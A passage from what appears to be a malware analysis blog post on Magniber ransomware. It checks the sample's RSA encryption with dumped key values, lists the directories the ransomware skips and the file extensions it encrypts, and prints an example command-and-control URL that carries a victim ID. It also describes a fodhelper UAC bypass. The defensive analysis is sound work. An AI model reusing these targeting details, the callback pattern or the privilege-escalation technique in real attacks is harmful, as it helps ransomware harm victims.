<figure class="wp-block-image size-full"><img data-attachment-id="9056" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/rsa_inside1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png" data-orig-size="784,430" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="rsa_inside1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png?w=640" loading="lazy" width="784" height="430" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png" alt="" class="wp-image-9056" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png 784w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png?w=150&amp;h=82 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png?w=400&amp;h=219 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png?w=768&amp;h=421 768w" sizes="(max-width: 784px) 100vw, 784px" /></figure>



<p>The prepared data, containing the AES key and IV are encrypted, and then copied to the output buffer.</p>



<h3 class="wp-block-heading">Verifying the RSA implementation</h3>



<p>Verifying the RSA implementation by static analysis may be a laborious tasks. So, I am gonna use a shortcut. I will dump the data involved in the encryption process: n &#8211; key, e &#8211; exponent, and m &#8211; message, and repeat the encryption with the help of public tools, where I am sure the RSA has been implemented correctly. If I can obtain the same ciphertext, it means that the implementation in the malware is valid.</p>



<p>I hooked the function <code>apply_assymmetric_crypto</code> and dumped the elements listed below. Full code of the loader can be found <a rel="noreferrer noopener" href="https://gist.github.com/hasherezade/6662b534d08786ddf1ba73457d4b94fe" target="_blank">here</a>.</p>



<p><em>Mind the fact that the order of bytes in the dumped buffer needs to be reversed. This can be done conveniently with CyberChief. Example <a rel="noreferrer noopener" href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Byte')To_Hex('Space',0)&amp;input=NjAgMTAgNTUgM0IgQ0MgRDAgRjIgN0QgMEYgMzQgNUUgRUUgMDIgQUMgMUEgMzIgMTYgNjQgNjkgRjcgRDYgNUYgNkUgNzMgRjEgRTEgRTYgQjUgNzggNjkgNDEgQjUgQzUgREEgRUMgRTYgRDAgOEEgRTUgM0MgOEMgQTAgQjYgQTYgMUMgMzMgNjQgREIgN0UgQTYgREIgRUMgNzggRjAgMzkgQTcgNTcgRjMgMTYgREEgNkIgN0YgMDUgNDcgNDMgQ0YgMUYgRDUgNDggOTggRkEgOUEgNEIgNzcgODcgRUIgRUYgRUYgMTIgQ0YgQUMgMDcgQkIgM0IgNDMgOEQgNzkgMDEgRjkgNkQgNjcgMEQgMzMgNzUgNDcgQ0QgMEUgQTIgNDkgM0UgOTEgQzUgODEgMEUgNkYgRjEgQkUgOTYgQTMgMzMgNEUgMUMgMDQgOUIgMkUgQjEgNzIgQUEgRjggNTMgRjQgMTYgNUEgQjggNEUgQTEgMjMgN0YgQTAgMTcgMjUgNzAgMkMgODkgMUMgOTAgMjYgQzIgN0MgMDUgRDYgODIgRTggRDYgMTMgRTYgNDIgMDkgRUIgNkYgRDggQkYgN0MgRjEgMDMgREIgNDIgOUYgNjUgMDIgMEUgRDkgODkgNTggRUIgMkEgNjIgNEMgRjkgMjcgMUUgQ0EgMDEgNkMgQTggRTEgODcgNEEgOTAgRDIgOEEgNjcgQ0UgOTcgMjUgNUIgRDEgMEEgNUIgQkMgM0MgNDIgMEYgNzkgMTIgNEMgOUEgMzQgOTQgRUYgNTggNTcgMTUgRDggRDUgNzAgMjMgODggMkUgRjEgNDggRUQgQTIgMjAgNjggMEQgODUgMEEgNUIgMDkgQUQgMDAgMjQgNTIgOTIgOUQgRTAgMUEgQzkgRjIgRTMgNDIgREYgNDkgOTAgRjIgMUMgQjYgNkEgOTIgRUYgODQgMUUgMDAgREIgQjcgRTggODggMjQgMEIgNEIgODIgQjAgMTkgMkQgMTE" target="_blank">here</a>.</em></p>



<p>RSA key components:</p>



<p><strong>e =</strong> <code>10001</code></p>



<p><strong>n</strong> =  <code>c6 c2 f7 3c 03 46 3d 1b 4e 3e a9 03 bb 4d 3a 6c cb f3 88 cf 53 5b 43 cb 75 17 97 8a 73 c6 88 01 46 ba cd 65 69 bf ef 20 f0 0a b2 a7 99 6d 3c 87 f1 a5 21 94 c1 53 1f 8c b6 69 3d 7e d0 d4 a4 ba 63 d1 37 8e 0f af 4b b5 71 4e 58 d0 7e 64 a0 2f 4d 16 43 fa 9f 51 19 b3 99 5d 7c 7d 66 e0 62 06 d3 cd 1c 63 76 5e 25 64 84 a1 dc 1e 09 84 e6 76 e3 48 aa a7 c3 66 e2 28 9f 3c 81 64 5b 6a 04 3d 92 e7 bf e9 65 39 c3 f6 53 fa 70 96 11 15 a5 50 75 76 e7 31 94 53 7c e6 5a bb 75 19 7a 6f 21 3b e0 db 42 cb 9f c7 d2 04 80 70 e8 83 d5 35 1e a7 40 ef d6 42 8c 2e 5e de f0 c9 51 fe 80 0f 6b 0b 16 13 3e 2b f1 e2 12 d9 58 8b 18 47 77 b2 2f 83 53 d6 a9 74 99 18 e2 ec 14 36 d1 6a bd 5c 00 77 ae 7f 52 26 7b e9 04 02 a8 e1 12 53 50 6c b8 34 2d da 11 bd c6 c4 b7 d9 19 02 16 9b 32 b4 1f 15</code></p>



<p>Content to be encrypted: random AES key + IV (hilighted) + padding:</p>



<p><strong>m =</strong> <code>00 02 ab 7e 91 79 c1 59 64 2f 7e af 7f c1 59 eb 13 7e af 7f 33 59 b3 0f 79 a1 1d 31 37 b3 0f 8f 9d 1d 35 81 c3 0f 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e 91 7f 33 59 eb 13 79 af 7f 33 37 b3 13 35 59 e7 72 41 f7 eb e5 f4 fb 72 41 f7 93 39 f4 fb ab eb f7 6f 91 ab e1 81 64 41 6f 91 79 c1 81 64 13 7e af 7f 33 72 41 f7 93 e5 f4 fb ab eb 41 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e cd 99 e7 09 97 33 3d 61 3f 79 45 97 33 93 e5 f4 fb ab 41 f7 93 39 ab fb 81 64 41 6f 91 79 c1 81 64 13 7e af 7f 33 37 eb 13 8f a1 1d 31 55 b3 0f 6c e7 c3 35 81 cb cb 6c e7 5d 5b 20 99 b3 ab 83 90 15 69 05 b3 49 5b 8f 62 59 79 0f 49 b3 15 7f 63 41 6c e7 5d 33 20 99 41 ab 33 5d 33 a7 00 <strong>f7 93 39 ab e1 81 64 13 7e af 7f 31 37 b3 cb 6c e7 63 3d 05 b3 4b b3 8f 62 6b 59 e9 61 09 f3 33</strong></code></p>



<p>The resulting ciphertext:</p>



<p><strong>c =</strong> <code>11 2d 19 b0 82 4b 0b 24 88 e8 b7 db 00 1e 84 ef 92 6a b6 1c f2 90 49 df 42 e3 f2 c9 1a e0 9d 92 52 24 00 ad 09 5b 0a 85 0d 68 20 a2 ed 48 f1 2e 88 23 70 d5 d8 15 57 58 ef 94 34 9a 4c 12 79 0f 42 3c bc 5b 0a d1 5b 25 97 ce 67 8a d2 90 4a 87 e1 a8 6c 01 ca 1e 27 f9 4c 62 2a eb 58 89 d9 0e 02 65 9f 42 db 03 f1 7c bf d8 6f eb 09 42 e6 13 d6 e8 82 d6 05 7c c2 26 90 1c 89 2c 70 25 17 a0 7f 23 a1 4e b8 5a 16 f4 53 f8 aa 72 b1 2e 9b 04 1c 4e 33 a3 96 be f1 6f 0e 81 c5 91 3e 49 a2 0e cd 47 75 33 0d 67 6d f9 01 79 8d 43 3b bb 07 ac cf 12 ef ef eb 87 77 4b 9a fa 98 48 d5 1f cf 43 47 05 7f 6b da 16 f3 57 a7 39 f0 78 ec db a6 7e db 64 33 1c a6 b6 a0 8c 3c e5 8a d0 e6 ec da c5 b5 41 69 78 b5 e6 e1 f1 73 6e 5f d6 f7 69 64 16 32 1a ac 02 ee 5e 34 0f 7d f2 d0 cc 3b 55 10 60</code></p>



<p>Reproducing the steps with a public tool, at: <a href="https://www.boxentriq.com/code-breaking/modular-exponentiation" target="_blank" rel="noreferrer noopener">https://www.boxentriq.com/code-breaking/modular-exponentiation</a> :</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9065" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/rsa_tool_out/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png" data-orig-size="660,805" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="rsa_tool_out" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=246" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=640" loading="lazy" width="660" height="805" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=660" alt="" class="wp-image-9065" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png 660w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=123 123w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=246 246w" sizes="(max-width: 660px) 100vw, 660px" /></figure>



<p>We can see that indeed, our output is identical like the one generated by the malware, so the RSA implementation is correct. No luck this time!</p>



<p>However, since the malware doesn&#8217;t generate a new keypair per each victim, and only uses the RSA key hardcoded in the sample, it may be possible to reuse the private key once purchased from the attacker, and share it with other victims of the identical sample.</p>



<h3 class="wp-block-heading">What is encrypted</h3>



<p>During the check with the help of FLOSS, we found in some directories hardcoded in the shellcode, that will be excluded from the encryption:</p>



<pre class="wp-block-preformatted">FLOSS static Unicode strings
[...]
documents and settings
appdata
local settings
sample music
sample pictures
sample videos
tor browser
recycle
windows
boot
intel
msocache
perflogs
program files
programdata
recovery
system volume information
winnt
[...]</pre>



<p>This list is being used at the beginnign of the function responsible for encrypting directory content:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9131" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/excluded_dir/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png" data-orig-size="391,121" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="excluded_dir" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png?w=391" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png?w=391" loading="lazy" width="391" height="121" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png?w=391" alt="" class="wp-image-9131" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png 391w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png?w=150 150w" sizes="(max-width: 391px) 100vw, 391px" /></figure>



<p>Yet, our extracted list of strings didn&#8217;t contain the attacked extensions &#8211; althougt it was clear during the behavioral analysis that not all files are encrypted. Let&#8217;s have a closer look at how this distinction is being made:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9048" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/file_check/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png" data-orig-size="390,172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="file_check" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png?w=390" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png?w=390" loading="lazy" width="390" height="172" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png" alt="" class="wp-image-9048" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png 390w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png?w=150&amp;h=66 150w" sizes="(max-width: 390px) 100vw, 390px" /></figure>



<p>The filtering of the files is done, by calculating hashes of their extensions, and then comparing them with a hardcoded list.</p>



<p>The function calculating the extension hash:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9053" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/calc_ext_hash/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png" data-orig-size="609,877" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="calc_ext_hash" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png?w=208" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png?w=609" loading="lazy" width="609" height="877" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png" alt="" class="wp-image-9053" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png 609w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png?w=104&amp;h=150 104w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png?w=208&amp;h=300 208w" sizes="(max-width: 609px) 100vw, 609px" /></figure>



<p>The list of the valid extension hashes is hardcoded in the malware. We can find the matching extension just by a brutforce method.</p>



<p>Again, I didn&#8217;t want to waste time reimplementing functions responsible for hashing the extensions, and for checking them, so I just plug the functions from the original malware to my code. You can see the brutforcer <a href="https://gist.github.com/hasherezade/86dd770cba355e0c4b950268869a5921" target="_blank" rel="noreferrer noopener">here</a>.</p>



<p>There are two list of extensions that can be selected depending on the flag passed to the function encrypting a directory:</p>



<pre class="wp-block-preformatted"><strong>List 0:</strong>
arc asf avi bak bmp fla flv gif gz iso jpeg jpg mid mkv mov mpeg mpg paq png rar swf tar tbk tgz tif tiff vcd vmdk vob wav wma wmv zip
<strong>
List 1:</strong>
abm abs abw act adn adp aes aft afx agif agp ahd ai aic aim albm alf ans apd apm apng aps apt apx art arw asc ase ask asm asp asw asy aty awdb awp awt aww azz bad bay bbs bdb bdp bdr bean bib bmx bna bnd boc bok brd brk brn brt bss btd bti btr c ca cals can cd cdb cdc cdg cdmm cdmt cdmz cdr cdt cf cfu cgm cimg cin cit ckp clkw cma cmx cnm cnv colz cpc cpd cpg cpp cps cpx crd crt crw cs csr csv csy ct cvg cvi cvs cvx cwt cxf cyi dad daf db dbc dbf dbk dbs dbt dbv dbx dca dcb dch dcr dcs dct dcx dd dds ded der dgn dgs dgt dhs dib dif dip diz djv djvu dmi dmo dnc dne doc docb docm docx docz dot dotm dotx dpp dpx dqy drw drz dsk dsn dsv dt dta dtsx dtw dv dvi dwg dx dxb dxf eco ecw ecx edb efd egc eio eip eit em emd emf emlx ep epf epp eps epsf eq erf err etf etx euc exr fa faq fax fb fbx fcd fcf fdf fdr fds fdt fdx fdxt fes fft fi fic fid fif fig flr fmv fo fodt fpos fpt fpx frm frt frx ftn fwdn fxc fxg fzb fzv gcdp gdb gdoc gem geo gfb gfie ggr gih gim gio glox gpd gpg gpn gro grob grs gsd gthr gtp gv gwi h hbk hdb hdp hdr hht his hp hpg hpi hs htc hwp hz ib ibd icn icon icpr idc idea idx igt igx ihx ii iiq imd info ink ipf ipx itdb itw iwi j jar jas java jbig jbmp jbr jfif jia jis jng joe jpe jps jpx jrtf js jsp jtf jtx jw jxr kdb kdbx kdc kdi kdk kes key kic klg knt kon kpg kwd lay lbm lbt ldf lgc lis lit ljp lmk lnt lrc lst ltr ltx lue luf lwo lwp lws lyt lyx ma mac man map maq mat max mb mbm mbox mdb mdf mdn mdt me mef mel mft mgcb mgmf mgmt mgmx mgtx min mm mmat mnr mnt mos mpf mpo mrg mrxs msg mud mwb mwp mx my myd myi ncr nct ndf nef nfo njx nlm now nrw nsf nyf nzb obj oce oci ocr odb odg odm odo odp ods odt of oft omf oplc oqy ora orf ort orx ost ota otg oti otp ots ott ovp ovr owc owg oyx ozb ozj ozt p pa pan pano pap pas pbm pcd pcs pdb pdd pdf pdm pds pdt pef pem pff pfi pfs pfv pfx pgf pgm phm php pic pict pix pjpg pjt plt pm pmg pni pnm pntg pnz pobj pop pot potm potx ppam ppm pps ppsm ppsx ppt pptm pptx prt prw psd psdx pse psid psp pst psw ptg pth ptx pu pvj pvm pvr pwa pwi pwr px pxr pza pzp pzs qd qmg qpx qry qvd rad ras raw rb rctd rcu rd rdb rft rgb rgf rib ric riff ris rix rle rli rng rpd rpf rpt rri rs rsb rsd rsr rst rt rtd rtf rtx run rw rzk rzn saf sam sbf scad scc sch sci scm sct scv scw sdb sdf sdm sdoc sdw sep sfc sfw sgm sh sig skm sla sld sldm sldx slk sln sls smf sms snt sob spa spe sph spj spp spq spr sq sqb srw ssa ssk st stc std sti stm stn stp str stw sty sub suo svf svg svgz sxc sxd sxg sxi sxm sxw tab tcx tdf tdt te tex text thp tlb tlc tm tmd tmv tmx tne tpc trm tvj udb ufr unx uof uop uot upd usr utxt vb vbr vbs vct vdb vdi vec vm vmx vnt vpd vrm vrp vsd vsdm vsdx vsm vstm vstx vue vw wbk wcf wdb wgz wire wks wmdb wn wp wpa wpd wpg wps wpt wpw wri wsc wsd wsh wtx x xar xd xdb xlc xld xlf xlgc xlm xls xlsb xlsm xlsx xlt xltm xltx xlw xps xwp xyp xyw ya ybk ym zabw zdb zdc zw</pre>



<p>The encrypting function is going to be called twice, each time a different list is enabled:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9217" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/encrypting_attempts/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png" data-orig-size="420,309" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="encrypting_attempts" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=420" loading="lazy" width="420" height="309" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=420" alt="" class="wp-image-9217" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png 420w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=400 400w" sizes="(max-width: 420px) 100vw, 420px" /></figure>



<p>So, both lists are going to be used.</p>



<h2 class="wp-block-heading">Communication with the C2</h2>



<p>The malware comes with an ability to communicate with the C2, for the purpose of upload of the statistics. After the series of encryption has finished, and if at least 100 files got encrypted, it sends an information about it to the server:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9220" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/upload_stats/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png" data-orig-size="656,231" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upload_stats" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=640" loading="lazy" width="656" height="231" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=656" alt="" class="wp-image-9220" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png 656w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=400 400w" sizes="(max-width: 656px) 100vw, 656px" /></figure>



<p>The passed data, including the unique victim ID, and various counts of the attacked targets, is merged together to create a URL. Example:</p>



<pre class="wp-block-preformatted">L"http://8e50de00b650821vieijibfm.jobsoon.fun/vieijibfm&amp;2&amp;1367508359&amp;14525&amp;55144&amp;2219043"</pre>



<figure class="wp-block-image size-full"><img data-attachment-id="9225" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/query_url/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png" data-orig-size="779,194" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="query_url" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png?w=640" loading="lazy" width="779" height="194" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png" alt="" class="wp-image-9225" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png 779w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png?w=150&amp;h=37 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png?w=400&amp;h=100 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png?w=768&amp;h=191 768w" sizes="(max-width: 779px) 100vw, 779px" /></figure>



<p>The base URL (<code>jobsoon.fun</code>) is hardcoded in the sample as a stack-based string, similarly to the name of the DLL to be loaded: <code>wininnet.dll</code>, that will be used for the internet connection.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9234" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/stack_based_strings/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png" data-orig-size="486,450" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="stack_based_strings" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=324" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=486" loading="lazy" width="486" height="450" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=486" alt="" class="wp-image-9234" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png 486w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=324 324w" sizes="(max-width: 486px) 100vw, 486px" /></figure>



<p>The relevant functions are loaded by their hashes, using the common technique involbing PEB lookup (similat to <a href="https://github.com/hasherezade/demos/tree/master/functions_loader" target="_blank" rel="noreferrer noopener">this one</a>).</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9236" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/get_by_hash/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png" data-orig-size="411,94" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="get_by_hash" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=411" loading="lazy" width="411" height="94" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=411" alt="" class="wp-image-9236" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png 411w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=400 400w" sizes="(max-width: 411px) 100vw, 411px" /></figure>



<h2 class="wp-block-heading">Privilege elevation</h2>



<p>The UAC bypass attempt involving fodhelper.exe (based on the PoC: <a rel="noreferrer noopener" href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" target="_blank">FodhelperBypass.ps1</a>.), that we observed during the tracing is executed between two series of files encryption. First the malware is trying to encrypt files without elevating the privileges. After it finished, it makes attempt to deploy the UAC bypass (without any prior checks if it is required). Then another attempt of deploying the encryption functions is being made.</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9232" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/uac_bypass_deployed/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png" data-orig-size="713,578" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="uac_bypass_deployed" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png?w=370" 